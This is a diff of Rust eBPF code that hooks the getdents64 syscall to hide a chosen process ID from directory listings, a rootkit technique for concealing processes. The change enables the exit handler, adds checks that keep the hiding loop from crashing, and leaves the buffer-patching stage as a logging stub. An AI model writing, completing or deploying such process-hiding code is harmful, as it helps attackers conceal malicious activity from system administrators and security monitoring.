@@ -47,15 +47,13 @@ pub fn hide_me(ctx: TracePointContext) -> u32 {
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
     let the_target_ppid = unsafe { target_ppid };
 
-    info!(&ctx, "target_ppid: {}", the_target_ppid);
-
     if the_target_ppid == 0 {
         return Ok(0);
     }
 
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
 
-    let pid = pid_tgid >> 32;
+    // let pid = pid_tgid >> 32;
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
     // field:unsigned int fd;                  offset:16; size:8; signed:0;
     // field:struct linux_dirent64 * dirent;   offset:24; size:8; signed:0;
@@ -70,7 +68,6 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
 #[tracepoint]
 fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
-    return Ok(0);
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
     // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
@@ -80,10 +77,15 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
         return Ok(0);
     }
 
-    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) }.unwrap();
+    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) };
+
+    if pbuff_addr.is_none() {
+        return Ok(0);
+    }
+
+    let pbuff_addr = pbuff_addr.unwrap();
 
     let buff_addr = *pbuff_addr;
-    let pid = pid_tgid >> 32;
 
     // linux_dirent64 结构体 大小
     let mut d_reclen: u16 = 0;
@@ -99,6 +101,8 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
 
     if let Some(pBPOS) = pBPOS {
         bpos = *pBPOS;
+    } else {
+        bpos = 0;
     }
 
     for _ in 0..128 {
@@ -114,17 +118,17 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
                 size_of_val(&d_reclen) as u32,
                 &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
             );
-        }
 
-        unsafe {
+            if pid_to_hide_len >= 11 {
+                return Ok(0);
+            }
+
             bpf_probe_read_user_str(
                 filename.as_mut_ptr() as *mut core::ffi::c_void,
-                pid_to_hide_len as u32,
+                pid_to_hide_len,
                 (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
             );
-        }
 
-        unsafe {
             let mut j: usize = 0;
             while j < pid_to_hide_len as usize {
                 if filename[j] != pid_to_hide[j] {
@@ -136,7 +140,10 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
             if j == pid_to_hide_len as usize {
                 map_bytes_read.remove(&pid_tgid).unwrap();
                 map_buffs.remove(&pid_tgid).unwrap();
-                JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).unwrap();
+
+                if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
+                    return Ok(0);
+                }
             }
         }
         map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();
@@ -145,8 +152,11 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
 
     if bpos < total_bytes_read as usize {
         map_bytes_read.insert(&pid_tgid, &bpos, 0).unwrap();
+
         unsafe {
-            JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).unwrap();
+            if JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).is_err() {
+                return Ok(0);
+            }
         }
     }
     map_bytes_read.remove(&pid_tgid).unwrap();
@@ -157,8 +167,8 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
 
 #[tracepoint]
 fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
-    info!(&ctx, "fuck you");
-    Ok(0)
+    info!(&ctx, "evening");
+    return Ok(0);
 }
 
 #[panic_handler]
